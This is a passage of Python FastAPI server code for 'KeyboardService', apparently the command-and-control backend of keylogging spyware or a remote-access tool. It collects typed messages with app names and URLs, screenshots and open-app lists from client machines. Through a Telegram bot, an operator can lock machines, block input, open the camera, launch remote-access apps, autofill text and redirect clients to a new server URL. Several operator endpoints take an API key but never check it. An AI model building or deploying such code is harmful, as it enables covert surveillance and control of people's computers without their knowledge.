import asyncio
import base64
import csv
import gzip
import hashlib
import hmac
import html
import io
import json
import os
import re
import time
import urllib.parse
import urllib.request
import uuid
import zipfile
from urllib.error import HTTPError
from contextlib import asynccontextmanager
from collections import deque
from pathlib import Path
from threading import Lock
from typing import Deque, Dict
from fastapi import FastAPI, Header, Request
from fastapi.responses import FileResponse, JSONResponse, RedirectResponse, Response, StreamingResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from starlette.datastructures import UploadFile
import psycopg
from PIL import Image, UnidentifiedImageError
from .state import state

@state.app.post('/api/devices/{device_id}/commands/{command_id}/ack')
async def acknowledge_device_command(device_id: str, command_id: str, request: Request):
    payload = await request.json()
    status = str(payload.get('status', 'failed')).strip().lower()
    error = str(payload.get('error', '')).strip()
    if status not in {'completed', 'failed'}:
        return JSONResponse({'ok': False, 'error': 'unsupported status'}, status_code=400)
    completed_at = int(time.time() * 1000)
    updated = False
    if state.DATABASE_URL:
        try:
            with psycopg.connect(state.DATABASE_URL) as connection:
                with connection.cursor() as cursor:
                    cursor.execute('UPDATE device_commands SET status = %s, completed_at = %s, error = %s WHERE command_id = %s AND device_id = %s', (status, completed_at, error, command_id, device_id.strip()))
                    updated = cursor.rowcount > 0
        except Exception as db_error:
            print(f'Could not acknowledge device command: {db_error}')
    record = state.device_command_records.get(command_id)
    if record and record['device_id'] == device_id.strip():
        record.update({'status': status, 'completed_at': completed_at, 'error': error})
        updated = True
    if not updated:
        return JSONResponse({'ok': False, 'error': 'command not found'}, status_code=404)
    state.audit_event('device_command_acknowledged', device_id=device_id, details={'command_id': command_id, 'status': status, 'error': error})
    return JSONResponse({'ok': True})
state.register('acknowledge_device_command', acknowledge_device_command)

def audit_event(event_type, actor='system', source='server', device_id='', details=None):
    if not state.DATABASE_URL:
        return
    try:
        with psycopg.connect(state.DATABASE_URL) as connection:
            with connection.cursor() as cursor:
                cursor.execute('\n                    INSERT INTO audit_events (event_type, actor, source, device_id, details, created_at)\n                    VALUES (%s, %s, %s, %s, %s::jsonb, %s)\n                    ', (event_type, actor, source, device_id, json.dumps(details or {}), int(time.time() * 1000)))
    except Exception as error:
        print(f'Could not save audit event: {error}')
state.register('audit_event', audit_event)

@state.app.get('/api/devices/{device_id}/update-check')
async def check_device_update(device_id: str, force: bool=False):
    normalized_device_id = device_id.strip()
    if not normalized_device_id or normalized_device_id not in state.devices:
        return JSONResponse({'ok': False, 'error': 'device not found'}, status_code=404)
    current_version = str(state.devices[normalized_device_id].get('client_version', '')).strip()
    try:
        latest_version = await asyncio.to_thread(state.get_latest_release_version, force)
    except Exception as error:
        return JSONResponse({'ok': False, 'error': f'Could not check for updates: {error}', 'current_version': current_version, 'latest_version': '', 'needs_update': False, 'is_up_to_date': False}, status_code=502)
    comparison = state.compare_versions(current_version, latest_version)
    return JSONResponse({'ok': True, 'current_version': current_version, 'latest_version': latest_version, 'needs_update': comparison < 0, 'is_up_to_date': comparison >= 0})
state.register('check_device_update', check_device_update)

def claim_device_command(device_id):
    normalized_device_id = str(device_id).strip()
    if state.DATABASE_URL:
        try:
            with psycopg.connect(state.DATABASE_URL) as connection:
                with connection.cursor() as cursor:
                    cursor.execute("\n                        SELECT command_id, device_id, command, message, requested_by, source, status, created_at, claimed_at, completed_at, error\n                        FROM device_commands\n                        WHERE device_id = %s AND status = 'queued'\n                        ORDER BY created_at ASC\n                        LIMIT 1\n                        FOR UPDATE SKIP LOCKED\n                        ", (normalized_device_id,))
                    row = cursor.fetchone()
                    if not row:
                        return None
                    claimed_at = int(time.time() * 1000)
                    cursor.execute("UPDATE device_commands SET status = 'claimed', claimed_at = %s WHERE command_id = %s", (claimed_at, row[0]))
            return {'command_id': row[0], 'device_id': row[1], 'command': row[2], 'message': row[3], 'requested_by': row[4], 'source': row[5], 'status': 'claimed', 'created_at': row[7], 'claimed_at': claimed_at, 'completed_at': row[9], 'error': row[10]}
        except Exception as error:
            print(f'Could not claim device command: {error}')
    command = state.screenshot_commands.pop(normalized_device_id, None)
    if not command:
        return None
    for record in state.device_command_records.values():
        if record['device_id'] == normalized_device_id and record['command'] == command and (record['status'] == 'queued'):
            record['status'] = 'claimed'
            record['claimed_at'] = int(time.time() * 1000)
            return record
    return None
state.register('claim_device_command', claim_device_command)

def configure_telegram_menu():
    try:
        state.telegram_api_request('deleteWebhook', {'drop_pending_updates': 'false'})
        command_result = state.telegram_api_request('setMyCommands', {'scope': json.dumps({'type': 'chat', 'chat_id': state.TELEGRAM_CHAT_ID}), 'commands': json.dumps([{'command': 'start', 'description': 'Welcome to KeyboardService'}, {'command': 'help', 'description': 'Show available commands'}, {'command': 'status', 'description': 'Show service health and uptime'}, {'command': 'devices', 'description': 'List connected devices'}, {'command': 'device', 'description': 'Show one device detail'}, {'command': 'controls', 'description': 'Show basic device controls'}, {'command': 'shutdown', 'description': 'Shut down a client by device ID'}, {'command': 'logout', 'description': 'Log out a client by device ID'}, {'command': 'restart', 'description': 'Restart a client by device ID'}, {'command': 'lock', 'description': 'Lock a client by device ID'}, {'command': 'pause', 'description': 'Pause collection by device ID'}, {'command': 'resume', 'description': 'Resume collection by device ID'}, {'command': 'screenshot', 'description': 'Request a client screenshot'}, {'command': 'messages', 'description': 'Show stored message totals'}, {'command': 'setsite', 'description': 'Change the desktop client service URL'}, {'command': 'support', 'description': 'Show support options'}])})
        if not command_result.get('ok'):
            raise RuntimeError(f'Telegram rejected command menu: {command_result}')
        print('Telegram command menu registered: /controls included')
    except Exception as error:
        print(f'Could not configure Telegram command menu: {error}')
state.register('configure_telegram_menu', configure_telegram_menu)

@state.app.post('/api/devices/heartbeat')
async def device_heartbeat(request: Request, payload: state.DeviceHeartbeat, x_api_key: str | None=Header(default=None)):
    expected_key = os.getenv('INGEST_API_KEY')
    if expected_key and x_api_key != expected_key:
        return JSONResponse({'ok': False, 'error': 'unauthorized'}, status_code=401)
    device_id = payload.device_id.strip()
    device_name = payload.device_name.strip() or 'Unknown device'
    if not device_id:
        return JSONResponse({'ok': False, 'error': 'missing device_id'}, status_code=400)
    client_ip = state.resolve_client_ip(request)
    now = int(time.time() * 1000)
    existing_device = state.devices.get(device_id, {})
    joined_at = int(existing_device.get('joined_at', now))
    was_online = state.device_online_states.get(device_id)
    if was_online is None and device_id in state.devices:
        was_online = now - int(state.devices[device_id].get('last_seen', 0)) <= state.DEVICE_OFFLINE_AFTER * 1000
    try:
        state.save_device(device_id, device_name, now, payload.started_at, joined_at, {'client_version': payload.client_version, 'client_ip': client_ip, 'local_ip': payload.local_ip, 'local_time': payload.local_time, 'local_time_ms': payload.local_time_ms, 'logged_in_user': payload.logged_in_user, 'battery_percent': payload.battery_percent, 'battery_status': payload.battery_status, 'open_apps': payload.open_apps})
    except Exception as error:
        print(f'Could not save device heartbeat: {error}')
        return JSONResponse({'ok': False, 'error': 'device storage unavailable'}, status_code=503)
    state.device_online_states[device_id] = True
    state.devices[device_id].update({'client_ip': client_ip, 'local_time': payload.local_time, 'logged_in_user': payload.logged_in_user or 'Unknown user', 'battery_percent': payload.battery_percent, 'battery_status': payload.battery_status or 'Unknown'})
    if was_online is not True:
        await asyncio.to_thread(state.notify_device_status, device_id, device_name, True)
    await asyncio.to_thread(state.notify_app_open_alerts, device_id, device_name, payload.open_apps)
    screenshot_requested = state.screenshot_requests.pop(device_id, None) is not None
    if screenshot_requested:
        state.screenshot_statuses[device_id] = {'status': 'Taking screenshot', 'message': 'The client is capturing the desktop.', 'updated_at': now}
    command = state.claim_device_command(device_id)
    response = {'ok': True, 'screenshot_requested': screenshot_requested, 'command': command.get('command') if command else None, 'command_id': command.get('command_id') if command else None, 'message': command.get('message', '') if command else ''}
    if state.valid_site_url(state.CLIENT_SITE_URL):
        response['client_site_url'] = state.CLIENT_SITE_URL
    return JSONResponse(response)
state.register('device_heartbeat', device_heartbeat)

@state.app.post('/api/devices/offline')
async def device_offline(payload: state.DeviceOffline, x_api_key: str | None=Header(default=None)):
    expected_key = os.getenv('INGEST_API_KEY')
    if expected_key and x_api_key != expected_key:
        return JSONResponse({'ok': False, 'error': 'unauthorized'}, status_code=401)
    device_id = payload.device_id.strip()
    if not device_id:
        return JSONResponse({'ok': False, 'error': 'missing device_id'}, status_code=400)
    if device_id in state.devices:
        was_online = state.device_online_states.get(device_id, True)
        state.device_online_states[device_id] = False
        if was_online:
            await asyncio.to_thread(state.notify_device_status, device_id, state.devices[device_id].get('name', 'Unknown device'), False)
    return JSONResponse({'ok': True})
state.register('device_offline', device_offline)

@state.app.get('/api/activity')
async def fetch_activity(device_id: str | None=None):
    selected = (device_id or '').strip()
    selected_messages = [item for item in state.messages if not selected or str(item.get('device_id')) == selected]
    selected_sites = []
    apps = {}
    domains = {}
    for item in selected_messages:
        app_name = str(item.get('app_name') or 'Unknown app')
        apps[app_name] = apps.get(app_name, 0) + 1
        source_url = str(item.get('source_url') or '').strip()
        if source_url:
            hostname = urllib.parse.urlparse(source_url).hostname
            if hostname:
                domains[hostname] = domains.get(hostname, 0) + 1
    return JSONResponse({
        'messages': len(selected_messages),
        'website_visits': sum(domains.values()),
        'raw_events': 0,
        'top_apps': sorted(apps.items(), key=lambda item: item[1], reverse=True)[:10],
        'top_domains': sorted(domains.items(), key=lambda item: item[1], reverse=True)[:10],
        'recent_messages': selected_messages[-20:],
    })
state.register('fetch_activity', fetch_activity)

@state.app.get('/api/devices/{device_id}/commands')
async def fetch_device_commands(device_id: str, limit: int=50):
    normalized_device_id = device_id.strip()
    if normalized_device_id not in state.devices:
        return JSONResponse({'ok': False, 'error': 'device not found'}, status_code=404)
    return JSONResponse(state.list_device_commands(normalized_device_id, limit))
state.register('fetch_device_commands', fetch_device_commands)

@state.app.get('/api/devices/{device_id}/detail')
async def fetch_device_detail(device_id: str):
    normalized_device_id = device_id.strip()
    device = state.devices.get(normalized_device_id)
    if not device:
        return JSONResponse({'ok': False, 'error': 'device not found'}, status_code=404)
    recent_messages = [item for item in state.messages if str(item.get('device_id')) == normalized_device_id][-50:]
    now = int(time.time() * 1000)
    last_seen = int(device.get('last_seen', 0))
    input_block_timer = state.input_block_timers.get(normalized_device_id)
    input_block_remaining_ms = 0
    if input_block_timer:
        input_block_remaining_ms = max(0, int(input_block_timer.get('expires_at', now)) - now)
    device_summary = {**device, 'online': state.device_online_states.get(normalized_device_id, now - last_seen <= state.DEVICE_OFFLINE_AFTER * 1000), 'last_seen_age_seconds': max(0, (now - last_seen) // 1000), 'input_block_status': 'Blocked' if input_block_timer and input_block_remaining_ms > 0 else 'Ready', 'input_block_remaining_seconds': (input_block_remaining_ms + 999) // 1000, 'commands': state.list_device_commands(normalized_device_id)}
    return JSONResponse({'device': device_summary, 'messages': recent_messages, 'commands': device_summary['commands']})
state.register('fetch_device_detail', fetch_device_detail)

@state.app.get('/api/devices')
async def fetch_devices():
    now = int(time.time() * 1000)
    for device_id, status in list(state.screenshot_statuses.items()):
        if status.get('status') in ('Requested', 'Taking screenshot', 'Capturing', 'Uploading'):
            age = (now - int(status.get('updated_at', now))) / 1000
            if age > state.SCREENSHOT_STATUS_TIMEOUT:
                state.screenshot_statuses[device_id] = {'status': 'Failed', 'message': 'The client did not finish within 90 seconds.', 'updated_at': now}
    expired_block_ids = [device_id for device_id, timer in state.input_block_timers.items() if now >= int(timer.get('expires_at', now))]
    for device_id in expired_block_ids:
        state.input_block_timers.pop(device_id, None)
    screenshot_captured_at = {}
    if state.DATABASE_URL:
        try:
            with psycopg.connect(state.DATABASE_URL) as connection:
                with connection.cursor() as cursor:
                    cursor.execute('SELECT DISTINCT ON (device_id) device_id, captured_at FROM screenshots ORDER BY device_id, captured_at DESC')
                    screenshot_captured_at = {str(row[0]): int(row[1]) for row in cursor.fetchall()}
        except Exception as error:
            error_text = str(error)
            if 'does not exist' in error_text or 'relation "screenshots"' in error_text:
                print(f'Screenshots table not ready yet: {error}')
            else:
                print(f'Could not load screenshot list: {error}')
    result = []
    for device in state.devices.values():
        device_time_ms = device.get('local_time_ms')
        if not isinstance(device_time_ms, (int, float)) or device_time_ms < 100000000000:
            device_time_ms = None
        last_seen = int(device.get('last_seen', 0))
        started_at = int(device.get('started_at', last_seen))
        age_seconds = max(0, (now - last_seen) // 1000)
        online = state.device_online_states.get(str(device['id']), age_seconds <= state.DEVICE_OFFLINE_AFTER)
        uptime_end = now if online else last_seen
        device_id = str(device['id'])
        input_block_timer = state.input_block_timers.get(device_id)
        input_block_remaining_ms = 0
        input_block_status = 'Ready'
        if input_block_timer:
            input_block_remaining_ms = max(0, int(input_block_timer.get('expires_at', now)) - now)
            input_block_status = 'Blocked' if input_block_remaining_ms > 0 else 'Ready'
        result.append({**device, 'online': online, 'status': 'Online' if online else 'Offline', 'last_seen_age_seconds': age_seconds, 'offline_after_seconds': state.DEVICE_OFFLINE_AFTER, 'uptime_seconds': max(0, (uptime_end - started_at) // 1000), 'local_time_ms': device_time_ms, 'input_block_status': input_block_status, 'input_block_remaining_seconds': (input_block_remaining_ms + 999) // 1000, 'screenshot_url': f"/api/devices/{device['id']}/screenshot/latest" if device_id in screenshot_captured_at else '', 'screenshot_captured_at': screenshot_captured_at.get(device_id), 'screenshot_status': state.screenshot_statuses.get(device_id, {}).get('status', 'Ready'), 'screenshot_message': state.screenshot_statuses.get(device_id, {}).get('message', '')})
    return JSONResponse(result)
state.register('fetch_devices', fetch_devices)

@state.app.get('/api/devices/{device_id}/screenshot/latest')
async def fetch_latest_device_screenshot(device_id: str):
    if not state.DATABASE_URL or not state.SUPABASE_URL or (not state.SUPABASE_SERVICE_ROLE_KEY):
        return JSONResponse({'ok': False, 'error': 'screenshot storage unavailable'}, status_code=503)
    try:
        image_bytes, media_type = await asyncio.to_thread(state.read_latest_screenshot_image_with_type, device_id.strip())
        if image_bytes is None:
            return JSONResponse({'ok': False, 'error': 'screenshot not found'}, status_code=404)
        return Response(image_bytes, media_type=media_type, headers={'Cache-Control': 'public, max-age=300'})
    except (HTTPError, urllib.error.URLError, TimeoutError, RuntimeError, psycopg.Error) as error:
        print(f'Could not load device screenshot: {error}')
        return JSONResponse({'ok': False, 'error': 'screenshot unavailable'}, status_code=503)
state.register('fetch_latest_device_screenshot', fetch_latest_device_screenshot)

@state.app.get('/api/screenshots/{screenshot_id}/image')
async def fetch_screenshot_image(screenshot_id: int):
    if not state.DATABASE_URL or not state.SUPABASE_URL or (not state.SUPABASE_SERVICE_ROLE_KEY):
        return JSONResponse({'ok': False, 'error': 'screenshot storage unavailable'}, status_code=503)
    try:
        image_bytes, media_type = await asyncio.to_thread(state.read_screenshot_image_with_type, screenshot_id)
        if image_bytes is None:
            return JSONResponse({'ok': False, 'error': 'screenshot not found'}, status_code=404)
        return Response(image_bytes, media_type=media_type, headers={'Cache-Control': 'no-store'})
    except (HTTPError, urllib.error.URLError, TimeoutError, RuntimeError, psycopg.Error) as error:
        detail = ''
        if isinstance(error, HTTPError):
            detail = error.read().decode('utf-8', errors='replace')[:240]
        elif isinstance(error, RuntimeError):
            detail = str(error)
        print(f"Could not load screenshot image: {error}{(f' - {detail}' if detail else '')}")
        return JSONResponse({'ok': False, 'error': 'screenshot unavailable', 'detail': detail or 'storage request failed'}, status_code=503)
state.register('fetch_screenshot_image', fetch_screenshot_image)

@state.app.get('/api/screenshots')
async def fetch_screenshots(device_id: str | None=None):
    if not state.DATABASE_URL:
        return JSONResponse([])
    try:
        with psycopg.connect(state.DATABASE_URL) as connection:
            with connection.cursor() as cursor:
                query = '\n                    SELECT screenshots.id, screenshots.device_id, screenshots.captured_at,\n                           screenshots.storage_path, devices.device_name\n                    FROM screenshots\n                    LEFT JOIN devices ON devices.device_id = screenshots.device_id\n                '
                values = []
                if device_id and device_id.strip():
                    query += ' WHERE screenshots.device_id = %s'
                    values.append(device_id.strip())
                query += ' ORDER BY screenshots.captured_at DESC LIMIT %s'
                values.append(state.SCREENSHOT_LIST_LIMIT)
                cursor.execute(query, values)
                rows = cursor.fetchall()
        return JSONResponse([{'id': row[0], 'device_id': row[1], 'captured_at': row[2], 'device_name': row[4] or 'Unknown device', 'image_url': f'/api/screenshots/{row[0]}/image'} for row in rows])
    except Exception as error:
        error_text = str(error)
        if 'does not exist' in error_text or 'relation "screenshots"' in error_text:
            print(f'Screenshots table not ready yet: {error}')
            return JSONResponse([])
        print(f'Could not load screenshots: {error}')
        return JSONResponse({'ok': False, 'error': 'screenshots unavailable'}, status_code=503)
state.register('fetch_screenshots', fetch_screenshots)

def list_device_commands(device_id, limit=50):
    if state.DATABASE_URL:
        try:
            with psycopg.connect(state.DATABASE_URL) as connection:
                with connection.cursor() as cursor:
                    cursor.execute('SELECT command_id, device_id, command, message, requested_by, source, status, created_at, claimed_at, completed_at, error FROM device_commands WHERE device_id = %s ORDER BY created_at DESC LIMIT %s', (device_id, min(max(limit, 1), 100)))
                    rows = cursor.fetchall()
            return [dict(zip(('command_id', 'device_id', 'command', 'message', 'requested_by', 'source', 'status', 'created_at', 'claimed_at', 'completed_at', 'error'), row)) for row in rows]
        except Exception as error:
            print(f'Could not list device commands: {error}')
    return [record for record in sorted(state.device_command_records.values(), key=lambda item: item['created_at'], reverse=True) if record['device_id'] == device_id][:limit]
state.register('list_device_commands', list_device_commands)

@state.app.get('/api/devices/{device_id}/screenshot-request')
async def poll_device_screenshot_request(device_id: str, x_api_key: str | None=Header(default=None)):
    expected_key = os.getenv('INGEST_API_KEY')
    if expected_key and x_api_key != expected_key:
        return JSONResponse({'ok': False, 'error': 'unauthorized'}, status_code=401)
    normalized_device_id = device_id.strip()
    if not normalized_device_id or normalized_device_id not in state.devices:
        return JSONResponse({'ok': False, 'error': 'device not found'}, status_code=404)
    now = int(time.time() * 1000)
    screenshot_requested = state.screenshot_requests.pop(normalized_device_id, None) is not None
    if screenshot_requested:
        state.screenshot_statuses[normalized_device_id] = {'status': 'Taking screenshot', 'message': 'The client is capturing the desktop.', 'updated_at': now}
    command = state.claim_device_command(normalized_device_id)
    return JSONResponse({'ok': True, 'screenshot_requested': screenshot_requested, 'command': command.get('command') if command else None, 'command_id': command.get('command_id') if command else None, 'message': command.get('message', '') if command else ''})
state.register('poll_device_screenshot_request', poll_device_screenshot_request)

def poll_telegram_commands():
    offset = None
    state.configure_telegram_menu()
    conflict_logged = False
    while True:
        try:
            values = {'timeout': 25}
            if offset is not None:
                values['offset'] = offset
            response = state.telegram_api_request('getUpdates', values, timeout=35)
            for update in response.get('result', []):
                offset = int(update['update_id']) + 1
                callback_query = update.get('callback_query')
                if callback_query:
                    callback_message = callback_query.get('message', {})
                    callback_chat = callback_message.get('chat', {})
                    if str(callback_chat.get('id')) != state.TELEGRAM_CHAT_ID:
                        continue
                    callback_replies = {'status': state.telegram_uptime_text, 'devices': state.telegram_devices_text, 'controls': state.telegram_controls_text, 'messages': state.telegram_messages_text, 'support': state.telegram_support_text, 'help': state.telegram_help_text}
                    callback_data = callback_query.get('data', '')
                    if callback_data.startswith('control:'):
                        _, action, device_id = callback_data.split(':', 2)
                        succeeded, result = state.queue_device_command(device_id, action)
                        callback_reply = lambda: state.telegram_panel(f'CLIENT // {action.upper()}', f'Command queued for <code>{html.escape(result)}</code>.' if succeeded else html.escape(result))
                    else:
                        callback_reply = callback_replies.get(callback_data)
                    if callback_reply:
                        state.telegram_api_request('answerCallbackQuery', {'callback_query_id': callback_query['id']})
                        state.telegram_api_request('sendMessage', {'chat_id': state.TELEGRAM_CHAT_ID, 'text': callback_reply(), 'parse_mode': 'HTML', 'reply_markup': json.dumps(state.telegram_menu_markup())})
                    continue
                message = update.get('message', {})
                chat = message.get('chat', {})
                text = (message.get('text') or '').strip()
                if str(chat.get('id')) != state.TELEGRAM_CHAT_ID:
                    continue
                command = text.split()[0] if text else ''
                command = command.split('@', 1)[0]
                command_lower = command.lower()
                reply = None
                if command_lower == '/start':
                    state.telegram_api_request('sendMessage', {'chat_id': state.TELEGRAM_CHAT_ID, 'text': state.telegram_panel('SHELL // MENU RESET', 'Inline command interface restored.'), 'parse_mode': 'HTML', 'reply_markup': json.dumps({'remove_keyboard': True})})
                    reply = state.telegram_start_text()
                elif command_lower == '/help':
                    reply = state.telegram_help_text()
                elif command_lower in {'/uptime', '/status'}:
                    reply = state.telegram_uptime_text()
                elif command_lower == '/devices':
                    reply = state.telegram_devices_text()
                elif command_lower == '/device':
                    reply = state.telegram_device_text(text[len(command):].strip())
                elif command_lower == '/controls':
                    reply = state.telegram_controls_text()
                elif command_lower in {'/shutdown', '/logout'}:
                    requested_device_id = text[len(command):].strip()
                    action = command_lower[1:]
                    succeeded, result = state.queue_device_command(requested_device_id, action)
                    reply = state.telegram_panel(f'CLIENT // {action.upper()}', f'Command queued for <code>{html.escape(result)}</code>.' if succeeded else html.escape(result))
                elif command_lower in {'/restart', '/lock', '/pause', '/resume'}:
                    requested_device_id = text[len(command):].strip()
                    action = command_lower[1:]
                    succeeded, result = state.queue_device_command(requested_device_id, action)
                    reply = state.telegram_panel(f'CLIENT // {action.upper()}', f'Command queued: <code>{html.escape(result)}</code>' if succeeded else html.escape(result))
                elif command_lower == '/screenshot':
                    requested_device_id = text[len(command):].strip()
                    if requested_device_id not in state.devices:
                        reply = state.telegram_panel('SCREENSHOT // FAILED', 'Device not found. Use /devices to check the device ID.')
                    else:
                        state.screenshot_requests[requested_device_id] = int(time.time() * 1000)
                        reply = state.telegram_panel('SCREENSHOT // QUEUED', f'Screenshot requested for <code>{html.escape(requested_device_id)}</code>.')
                elif command_lower == '/messages':
                    reply = state.telegram_messages_text()
                elif command_lower == '/setsite':
                    requested_url = text[len(command):].strip()
                    if not state.valid_site_url(requested_url):
                        reply = state.telegram_panel('CLIENT URL // INVALID', 'Usage: <code>/setsite https://your-service.onrender.com</code>')
                    else:
                        try:
                            state.set_client_site_url(requested_url)
                            reply = state.telegram_panel('CLIENT URL // UPDATED', f'Desktop clients will switch to <code>{html.escape(state.CLIENT_SITE_URL)}</code> on their next heartbeat.')
                        except Exception as error:
                            print(f'Could not save client site URL: {error}')
                            reply = state.telegram_panel('CLIENT URL // FAILED', 'Could not save the URL. Check DATABASE_URL and run migrations/000_all.sql.')
                elif command_lower in {'/support', '/buymeacoffee'}:
                    reply = state.telegram_support_text()
                if reply:
                    state.telegram_api_request('sendMessage', {'chat_id': state.TELEGRAM_CHAT_ID, 'text': reply, 'parse_mode': 'HTML', 'reply_markup': json.dumps(state.telegram_controls_markup() if command_lower == '/controls' else state.telegram_menu_markup())})
        except HTTPError as error:
            if error.code == 409:
                if not conflict_logged:
                    print('Telegram command polling is already active elsewhere; stop the other bot process to enable /buymeacoffee.')
                    conflict_logged = True
                time.sleep(30)
                continue
            print(f'Could not process Telegram commands: {error}')
            time.sleep(5)
        except Exception as error:
            print(f'Could not process Telegram commands: {error}')
            time.sleep(5)
state.register('poll_telegram_commands', poll_telegram_commands)

def queue_device_command(device_id, command, message=''):
    normalized_device_id = str(device_id).strip()
    normalized_command = str(command).strip().lower()
    normalized_message = str(message).strip()
    now = int(time.time() * 1000)
    if not normalized_device_id or normalized_device_id not in state.devices:
        return (False, 'Device not found. Use /devices to check the device ID.')
    allowed_commands = {'shutdown', 'logout', 'restart', 'lock', 'block_input', 'pause', 'resume', 'open_camera', 'close_app', 'close_all_apps', 'open_ultraviewer', 'open_remote_app', 'autofill', 'update_client', 'show_image', 'open_document'}
    if normalized_command not in allowed_commands:
        if normalized_command != 'message' or not normalized_message:
            return (False, 'Unsupported client command.')
    if normalized_command in {'open_camera', 'block_input'}:
        try:
            duration = int(normalized_message)
        except (TypeError, ValueError):
            return (False, f"{normalized_command.replace('_', ' ').title()} duration must be a whole number of seconds.")
        if duration < 1 or duration > 3600:
            return (False, f"{normalized_command.replace('_', ' ').title()} duration must be between 1 and 3600 seconds.")
        if normalized_command == 'block_input':
            state.input_block_timers[normalized_device_id] = {'started_at': now, 'duration_seconds': duration, 'expires_at': now + duration * 1000}
    elif normalized_command == 'close_app':
        if not normalized_message:
            return (False, 'App name is required to close a window.')
    elif normalized_command == 'close_all_apps':
        normalized_message = ''
    elif normalized_command == 'autofill' and (not normalized_message):
        return (False, 'Autofill text is required.')
    elif normalized_command == 'open_document':
        try:
            attachment = json.loads(normalized_message)
        except (TypeError, ValueError):
            return (False, 'Document attachment is invalid.')
        attachment_id = attachment.get('attachment_id', '') if isinstance(attachment, dict) else ''
        if not re.fullmatch('[0-9a-f]{32}\\.(pdf|docx|rtf|txt)', str(attachment_id)):
            return (False, 'Document attachment is invalid.')
    if len(normalized_message) > (2200 if normalized_command == 'show_image' else 2000):
        return (False, 'Message is limited to 2000 characters.')
    if normalized_command == 'message' and (not normalized_message):
        return (False, 'Unsupported client command.')
    command_id = uuid.uuid4().hex
    now = int(time.time() * 1000)
    record = {'command_id': command_id, 'device_id': normalized_device_id, 'command': normalized_command, 'message': normalized_message, 'requested_by': 'dashboard', 'source': 'dashboard', 'status': 'queued', 'created_at': now, 'claimed_at': None, 'completed_at': None, 'error': ''}
    state.device_command_records[command_id] = record
    if state.DATABASE_URL:
        try:
            with psycopg.connect(state.DATABASE_URL) as connection:
                with connection.cursor() as cursor:
                    cursor.execute('\n                        INSERT INTO device_commands\n                            (command_id, device_id, command, message, requested_by, source, status, created_at)\n                        VALUES (%s, %s, %s, %s, %s, %s, %s, %s)\n                        ', (command_id, normalized_device_id, normalized_command, normalized_message, 'dashboard', 'dashboard', 'queued', now))
        except Exception as error:
            print(f'Could not persist device command: {error}')
    else:
        state.screenshot_commands[normalized_device_id] = normalized_command
    state.audit_event('device_command_queued', device_id=normalized_device_id, details={'command_id': command_id, 'command': normalized_command})
    return (True, command_id)
state.register('queue_device_command', queue_device_command)

def read_latest_screenshot_image(device_id):
    with psycopg.connect(state.DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute('SELECT storage_path FROM screenshots WHERE device_id = %s ORDER BY captured_at DESC LIMIT 1', (device_id,))
            row = cursor.fetchone()
    if not row:
        return None
    return state.read_storage_image(str(row[0]))
state.register('read_latest_screenshot_image', read_latest_screenshot_image)

def read_latest_screenshot_image_with_type(device_id):
    with psycopg.connect(state.DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute('SELECT storage_path FROM screenshots WHERE device_id = %s ORDER BY captured_at DESC LIMIT 1', (device_id,))
            row = cursor.fetchone()
    if not row:
        return (None, 'image/jpeg')
    storage_path = str(row[0])
    return (state.read_storage_image(storage_path), state.screenshot_media_type(storage_path))
state.register('read_latest_screenshot_image_with_type', read_latest_screenshot_image_with_type)

def read_screenshot_image(screenshot_id):
    with psycopg.connect(state.DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute('SELECT storage_path FROM screenshots WHERE id = %s', (screenshot_id,))
            row = cursor.fetchone()
    if not row:
        return None
    return state.read_storage_image(str(row[0]))
state.register('read_screenshot_image', read_screenshot_image)

def read_screenshot_image_with_type(screenshot_id):
    with psycopg.connect(state.DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute('SELECT storage_path FROM screenshots WHERE id = %s', (screenshot_id,))
            row = cursor.fetchone()
    if not row:
        return (None, 'image/jpeg')
    storage_path = str(row[0])
    return (state.read_storage_image(storage_path), state.screenshot_media_type(storage_path))
state.register('read_screenshot_image_with_type', read_screenshot_image_with_type)

def read_storage_image(storage_path):
    storage_path = storage_path.lstrip('/')
    encoded_storage_path = urllib.parse.quote(storage_path, safe='/')
    last_error = None
    for attempt in range(3):
        storage_request = urllib.request.Request(f'{state.SUPABASE_URL}/storage/v1/object/{state.SCREENSHOT_BUCKET}/{encoded_storage_path}', headers={'Authorization': f'Bearer {state.SUPABASE_SERVICE_ROLE_KEY}', 'apikey': state.SUPABASE_SERVICE_ROLE_KEY})
        try:
            with urllib.request.urlopen(storage_request, timeout=30) as response:
                return response.read()
        except HTTPError as error:
            detail = error.read().decode('utf-8', errors='replace')[:240]
            last_error = RuntimeError(f'Storage download HTTP {error.code} path={storage_path}: {detail}')
            if error.code != 400 or attempt == 2:
                raise last_error from error
            time.sleep(2)
    raise last_error or RuntimeError('Storage download failed')
state.register('read_storage_image', read_storage_image)

@state.app.post('/api/devices/{device_id}/command')
async def request_device_command(device_id: str, request: Request, x_api_key: str | None=Header(default=None)):
    payload = await request.json()
    command = str(payload.get('command', '')).strip().lower()
    succeeded, result = state.queue_device_command(device_id, command, payload.get('message', ''))
    if not succeeded:
        status_code = 404 if result.startswith('Device not found') else 400
        return JSONResponse({'ok': False, 'error': result.lower()}, status_code=status_code)
    return JSONResponse({'ok': True, 'command_id': result})
state.register('request_device_command', request_device_command)

@state.app.post('/api/devices/{device_id}/screenshot')
async def request_device_screenshot(device_id: str, x_api_key: str | None=Header(default=None)):
    normalized_device_id = device_id.strip()
    if not normalized_device_id or normalized_device_id not in state.devices:
        return JSONResponse({'ok': False, 'error': 'device not found'}, status_code=404)
    state.screenshot_requests[normalized_device_id] = int(time.time() * 1000)
    state.screenshot_statuses[normalized_device_id] = {'status': 'Requested', 'message': 'Waiting for the client to poll the screenshot request.', 'updated_at': int(time.time() * 1000)}
    return JSONResponse({'ok': True})
state.register('request_device_screenshot', request_device_screenshot)

def save_screenshot(device_id, screenshot_base64):
    image_bytes = base64.b64decode(screenshot_base64, validate=True)
    captured_at = int(time.time() * 1000)
    storage_path = f'{device_id}/{captured_at}.png'
    encoded_storage_path = urllib.parse.quote(storage_path, safe='/')
    storage_request = urllib.request.Request(f'{state.SUPABASE_URL}/storage/v1/object/{state.SCREENSHOT_BUCKET}/{encoded_storage_path}', data=image_bytes, headers={'Authorization': f'Bearer {state.SUPABASE_SERVICE_ROLE_KEY}', 'apikey': state.SUPABASE_SERVICE_ROLE_KEY, 'Content-Type': 'image/png', 'x-upsert': 'false'}, method='POST')
    try:
